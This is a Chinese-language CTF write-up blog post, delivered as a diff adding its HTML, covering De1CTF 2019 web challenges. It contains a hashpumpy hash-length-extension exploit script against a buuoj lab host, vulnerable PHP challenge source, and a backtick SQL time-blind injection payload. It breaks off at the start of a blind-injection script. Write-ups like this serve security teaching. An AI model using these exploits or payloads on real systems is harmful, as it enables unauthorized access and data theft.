@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="De1CTF2019-wp"/>
+
+
+
+
+  <meta name="keywords" content="wp," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="glotozz'blog">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />
+
+
+
+<link rel="canonical" href="https://glotozz.github.io/2019/08/29/De1CTF2019-wp/"/>
+
+
+<meta property="og:type" content="article">
+<meta property="og:title" content="De1CTF2019-wp">
+<meta property="og:url" content="https://glotozz.github.io/2019/08/29/De1CTF2019-wp/index.html">
+<meta property="og:site_name" content="glotozz&#39;blog">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2019-08-29T00:52:18.000Z">
+<meta property="article:modified_time" content="2020-05-20T15:56:43.831Z">
+<meta property="article:author" content="glotozz">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+
+
+<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/song/media/outer/url?id=28592088.mp3"></iframe>--!>
+<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="/57a2_fa12_13ff_c310c1889d0f14b24334ad7afef6b9b1.mp3"></iframe>--!>
+<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/outchain/player?type=2&id=574288806&auto=0&height=66"></iframe>--!>
+    <title> De1CTF2019-wp - glotozz'blog </title>
+  <meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="glotozz'blog" type="application/atom+xml">
+</head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">glotozz'blog</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/archives">
+                            
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/read">
+                            
+                            
+                                Read
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/stars">
+                            
+                            
+                                Stars
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          De1CTF2019-wp
+        
+      </h1>
+
+      <time class="post-time">
+          Aug 29 2019
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <meta name="referrer" content="no-referrer">
+<a id="more"></a>
+
+<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p>
+<!-- toc -->
+
+<ul>
+<li><a href="#ssrfme">SSRFME</a></li>
+<li><a href="#shellshellshell">ShellShellShell</a><ul>
+<li><a href="#giftbox">GiftBox</a></li>
+</ul>
+</li>
+<li><a href="#参考链接">参考链接：</a></li>
+</ul>
+<!-- tocstop -->
+
+<hr>
+<h3><span id="ssrfme">SSRFME</span></h3><p>给出了源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>flask框架，大概流程是先再geneSign()根据传入的变量生成Sign，然后再访问De1ta的时候checkSign()，action中的scan()是urlopen并写入result.txt，action中的read是读取result.txt</p>
+<p>主要是绕过checkSign()的验证，利用hash长度扩展攻击</p>
+</blockquote>
+<p>对于waf()，我当时听韩大佬说可以直接flag.txt，而我和力哥一开始一直在想利用别的协议。。。最后官方的预期解是local_file=flag.txt😁</p>
+<blockquote>
+<p>然后就是利用hash长度扩展攻击，但是这题也可以不用，很简单的思路</p>
+<p>geneSign的时候action默认为scan</p>
+<p>flag.txt+scan</p>
+<p>而我们第二步需要存在read</p>
+<p>flag.txt+readscan</p>
+<p>所以第一次geneSign的时候直接构造</p>
+<p>param为flag.txtread即可，这样两次的字符串相同，hash值也相同</p>
+</blockquote>
+<p>下面贴一下hash长度扩展攻击的脚本，原理可以参考第一个链接</p>
+<blockquote>
+<p><code>hashpumpy.hashpump(&#39;ffffffff&#39;, &#39;original_data&#39;, &#39;data_to_add&#39;, len(&#39;KEYKEYKEY&#39;))</code></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexdigest(str):      Hex-encoded result of hashing key + original_data.</span><br><span class="line">original_data(str):  Known data used to get the hash result hexdigest.</span><br><span class="line">data_to_add(str):    Data to append</span><br><span class="line">key_length(int):     Length of unknown data prepended to the hash</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">payload1=<span class="string">'flag.txt'</span></span><br><span class="line">payload=urllib.quote(payload1)</span><br><span class="line">url1=<span class="string">'http://2cf1f01a-89a9-4164-b9f4-1b94c4652867.node1.buuoj.cn/geneSign?param='</span></span><br><span class="line">c=requests.get(url1+payload)</span><br><span class="line">s=c.text</span><br><span class="line"><span class="keyword">print</span> s</span><br><span class="line"><span class="comment">#已知secret+flag.txt+scan的hash值，选择要附加上的值为read</span></span><br><span class="line">m=hashpumpy.hashpump(s,payload+<span class="string">'scan'</span>,<span class="string">'read'</span>,<span class="number">16</span>)</span><br><span class="line"><span class="comment">#方法2，也可以选择将payload加在secret后作为secret的一部分</span></span><br><span class="line"><span class="comment">#m=hashpumpy.hashpump(s,'scan','read',16+len(payload))</span></span><br><span class="line">cookies=&#123;	</span><br><span class="line">	<span class="string">'sign'</span>:m[<span class="number">0</span>],</span><br><span class="line">    <span class="string">'action'</span>:urllib.quote(m[<span class="number">1</span>][len(payload):])</span><br><span class="line">	<span class="comment">#方法2</span></span><br><span class="line">	<span class="comment">#'action':urllib.quote(m[1])</span></span><br><span class="line">&#125;</span><br><span class="line">url=<span class="string">"http://2cf1f01a-89a9-4164-b9f4-1b94c4652867.node1.buuoj.cn/De1ta?param="</span></span><br><span class="line">r=requests.get(url+payload,cookies=cookies)</span><br><span class="line"><span class="keyword">print</span> r.text</span><br></pre></td></tr></table></figure>
+
+
+
+<h3><span id="shellshellshell">ShellShellShell</span></h3><blockquote>
+<p>好题！！，好就好在不会做。。</p>
+</blockquote>
+<p>源码泄露，index.php~，index.php又存在LFI漏洞<code>index.php</code>，允许我们从文件系统泄漏任意文件。</p>
+<p>首先是register.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">function register()</span><br><span class="line">&#123;</span><br><span class="line">    if(isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;]) &amp;&amp; isset($_POST[&#39;code&#39;])) &#123;</span><br><span class="line">        if(substr(md5($_POST[&#39;code&#39;]),0, 5)!&#x3D;&#x3D;$_SESSION[&#39;code&#39;])</span><br><span class="line">        &#123;</span><br><span class="line">            die(&quot;code error&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $username &#x3D; $_POST[&#39;username&#39;];</span><br><span class="line">        $password &#x3D; md5($_POST[&#39;password&#39;]);</span><br><span class="line"></span><br><span class="line">        if(!$this-&gt;check_username($username))</span><br><span class="line">            die(&#39;Invalid user name&#39;);</span><br><span class="line">        if(!$this-&gt;is_exists($username)) &#123;</span><br><span class="line"></span><br><span class="line">            $db &#x3D; new Db();</span><br><span class="line"></span><br><span class="line">            @$ret &#x3D; $db-&gt;insert(array(&#39;username&#39;,&#39;password&#39;,&#39;ip&#39;,&#39;is_admin&#39;,&#39;allow_diff_ip&#39;),&#39;ctf_users&#39;,array($username,$password,get_ip(),&#39;0&#39;,&#39;1&#39;)); &#x2F;&#x2F;No one could be admin except me</span><br><span class="line">            if($ret)</span><br><span class="line">                return true;</span><br><span class="line">            else</span><br><span class="line">                return false;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        else &#123;</span><br><span class="line">            die(&quot;The username is not unique&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>提示//No one could be admin except me，思路应该要清楚，既然is_admin以及被设为0，那么就应该想到应该是要爆破出账户为admin的密码，它的is_admin应该为1</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">function publish()</span><br><span class="line">    &#123;</span><br><span class="line">        if(!$this-&gt;check_login()) return false;</span><br><span class="line">        if($this-&gt;is_admin &#x3D;&#x3D; 0)</span><br><span class="line">        &#123;</span><br><span class="line">            if(isset($_POST[&#39;signature&#39;]) &amp;&amp; isset($_POST[&#39;mood&#39;])) &#123;</span><br><span class="line"></span><br><span class="line">            $mood &#x3D; addslashes(serialize(new Mood((int)$_POST[&#39;mood&#39;],get_ip())));</span><br><span class="line">            $db &#x3D; new Db();</span><br><span class="line">            @$ret &#x3D; $db-&gt;insert(array(&#39;userid&#39;,&#39;username&#39;,&#39;signature&#39;,&#39;mood&#39;),&#39;ctf_user_signature&#39;,array($this-&gt;userid,$this-&gt;username,$_POST[&#39;signature&#39;],$mood));</span><br><span class="line">            if($ret)</span><br><span class="line">                return true;</span><br><span class="line">            else</span><br><span class="line">                return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">            if(isset($_FILES[&#39;pic&#39;])) </span><br><span class="line">            &#123;</span><br><span class="line">                $dir&#x3D;&#39;&#x2F;app&#x2F;upload&#x2F;&#39;;</span><br><span class="line">                move_uploaded_file($_FILES[&#39;pic&#39;][&#39;tmp_name&#39;],$dir.$_FILES[&#39;pic&#39;][&#39;name&#39;]);</span><br><span class="line">                echo &quot;&lt;script&gt;alert(&#39;&quot;.$_FILES[&#39;pic&#39;][&#39;name&#39;].&quot;upload success&#39;);&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">                return false;</span><br><span class="line">                </span><br><span class="line">     &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">private function get_column($columns)&#123;</span><br><span class="line">    if(is_array($columns))</span><br><span class="line">        $column &#x3D; &#39; &#96;&#39;.implode(&#39;&#96;,&#96;&#39;,$columns).&#39;&#96; &#39;;</span><br><span class="line">    else</span><br><span class="line">        $column &#x3D; &#39; &#96;&#39;.$columns.&#39;&#96; &#39;;</span><br><span class="line">    return $column;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function insert($columns,$table,$values)&#123;</span><br><span class="line">    $column &#x3D; $this-&gt;get_column($columns);</span><br><span class="line">    $value &#x3D; &#39;(&#39;.preg_replace(&#39;&#x2F;&#96;([^&#96;,]+)&#96;&#x2F;&#39;,&#39;\&#39;$&#123;1&#125;\&#39;&#39;,$this-&gt;get_column($values)).&#39;)&#39;;</span><br><span class="line">    $nid &#x3D;</span><br><span class="line">    $sql &#x3D; &#39;insert into &#39;.$table.&#39;(&#39;.$column.&#39;) values &#39;.$value;</span><br><span class="line">    $result &#x3D; $this-&gt;conn-&gt;query($sql);</span><br><span class="line">    return $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>举个栗子</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$pattern&#x3D;&#39;&#x2F;(a)(m),(g)&#x2F;&#39;;</span><br><span class="line">$subject&#x3D;&#39;hello, i am,good person ,aa mame nname&#39;;</span><br><span class="line">$str&#x3D;preg_replace($pattern, &#39;$&#123;1&#125;我和$&#123;2&#125;$&#123;3&#125;你&#39;, $subject);</span><br><span class="line">输出结果是</span><br><span class="line">hello, i a我和mg你ood person ,aa mame nname</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>在 subject 中搜索 pattern 模式的匹配项并替换为 replacement。如果指定了 limit，则仅替换 limit 个匹配，如果省略 limit 或者其值为 -1，则所有的匹配项都会被替换。</p>
+</blockquote>
+<blockquote>
+<p>mysql中引入反引号是为了区分MYSQL的保留字与普通字符而引入的符号，反引号注入可以了解一下</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into test(&#96;desc&#96;) values(&#39;fxf&#39;)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>本地测试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	function get_column($columns)&#123;</span><br><span class="line">	    if(is_array($columns))&#123;</span><br><span class="line">	        $column &#x3D; &#39; &#96;&#39;.implode(&#39;&#96;,&#96;&#39;,$columns).&#39;&#96; &#39;;</span><br><span class="line">	    	&#x2F;&#x2F;echo implode(&#39;&#96;,&#96;&#39;,$columns).&quot;\n&quot;;</span><br><span class="line">	    	&#x2F;&#x2F;&#96;a&#96;,&#96;mood&#96;); --&#96;,&#96;b&#96;</span><br><span class="line">	    &#125;</span><br><span class="line">	    else</span><br><span class="line">	        $column &#x3D; &#39; &#96;&#39;.$columns.&#39;&#96; &#39;;</span><br><span class="line">	    return $column;</span><br><span class="line">	&#125;</span><br><span class="line">	function insert($columns,$table,$values)&#123;</span><br><span class="line">	    $column &#x3D; get_column($columns);</span><br><span class="line">	    $value &#x3D; &#39;(&#39;.preg_replace(&#39;&#x2F;&#96;([^&#96;,]+)&#96;&#x2F;&#39;,&#39;\&#39;$&#123;1&#125;\&#39;&#39;,get_column($values)).&#39;)&#39;;</span><br><span class="line">	    $sql &#x3D; &#39;insert into &#39;.$table.&#39;(&#39;.$column.&#39;) values &#39;.$value;</span><br><span class="line">	    echo $sql;</span><br><span class="line">	&#125;</span><br><span class="line">	echo insert(array(&#39;name&#39;,&#39;age&#39;),&#39;user&#39;,array(&#39;a&#96;,if(1&#x3D;1,sleep(5),1); --&#39;,&#39;b&#39;));</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这里存在insert时间盲注，先注册个账户登上去</p>
+<p>signature=a`,if(1=1,sleep(5),1)); – -&amp;mood=1</p>
+</blockquote>
+<p>写个脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Time    : 2019&#x2F;8&#x2F;30 9:13</span><br><span class="line"># @Author  : glotozz</span><br><span class="line"># @File    : time-blind.py</span><br><span class="line"># coding&#x3D;utf-8</span><br><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">s &#x3D; requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f &#x3D; open(&quot;captchas.txt&quot;)</span><br><span class="line">line &#x3D; f.readline()</span><br><span class="line">dict &#x3D; 